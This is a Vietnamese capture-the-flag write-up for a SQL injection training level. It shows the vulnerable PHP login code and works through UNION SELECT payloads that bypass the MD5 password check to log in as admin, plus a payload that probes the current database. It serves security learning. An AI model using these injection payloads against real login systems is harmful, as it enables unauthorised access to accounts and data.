# SQL Injection 5
# Mục tiêu: Login as admin
# Phân tích
```
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username, password FROM users WHERE username='$username'";
		echo $sql; // Debugging: Show the SQL query
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Username not found"; // No result

		$login_user = $row["username"];
		$login_password = $row["password"];

		if ($login_password !== md5($password))
			return "Wrong username or password";

		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about <a href='level6.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
- Ở đây khi nhập user và password
- `$username = $_POST["username"];` và `$sql = "SELECT username, password FROM users WHERE username='$username'";`
- `$username` được sử dụng trực tiếp trong câu sql.
- Lấy kết quả
```
$login_user = $row["username"];
$login_password = $row["password"];
```
- So sánh pass người dùng nhập và pass được lưu trong db bằng MD5.
```
if ($login_password !== md5($password))
    return "Wrong username or password";
```
# Khai thac
- Có cách nào thao túng được pass không
- Sử dụng `UNION SELECT`
```
SELECT username, password FROM users WHERE username='abc' UNION SELECT 'admin',MD5('huy') -- '
```
Thành công.  
✅ Vì sao nó hoạt động?

1. `UNION` hợp lệ:

    Cả 2 phần `SELECT` đều trả về 2 cột cùng kiểu dữ liệu (`username`, `password` dạng chuỗi).

2. `'admin'` và `MD5('huy')` là hằng số:

    `'admin'` là chuỗi (VARCHAR)

    `MD5('huy')` là chuỗi băm hợp lệ: ae9d45875e514d8fc9f1b1bc9c37fe2b

3. Phần `-- '` là comment:

    Cắt phần đuôi của truy vấn gốc (nếu có ' hoặc các đoạn dư phía sau).

```
SELECT username, password FROM users WHERE username='abc' UNION SELECT username,MD5('huy123') FROM users WHERE username='admin'
```
✅ Tại sao nó chạy được?
1. Hai phần SELECT có cùng số cột: Cả hai đều chọn `2 cột`

2. Kiểu dữ liệu tương thích: Cột `password` là chuỗi, `MD5('huy123')` cũng là chuỗi.

3. UNION ghép kết quả lại: Nếu truy vấn gốc không trả về gì (username='abc' không tồn tại), thì kết quả `UNION` vẫn trả về dữ liệu từ truy vấn sau.

4. Dùng để đọc dữ liệu, không phải ghi dữ liệu: Truy vấn này không thay đổi database, mà chỉ lấy dữ liệu theo cách kẻ tấn công muốn.

# Khi sử dụng `UNION SELECT`
`UNION SELECT 'admin',MD5('huy') -- '` vì có `'admin'` thì nó là chuỗi. Khi không có `'` thì nó là cột.

`UNION SELECT NULL,database() --` playload check database hiện tại
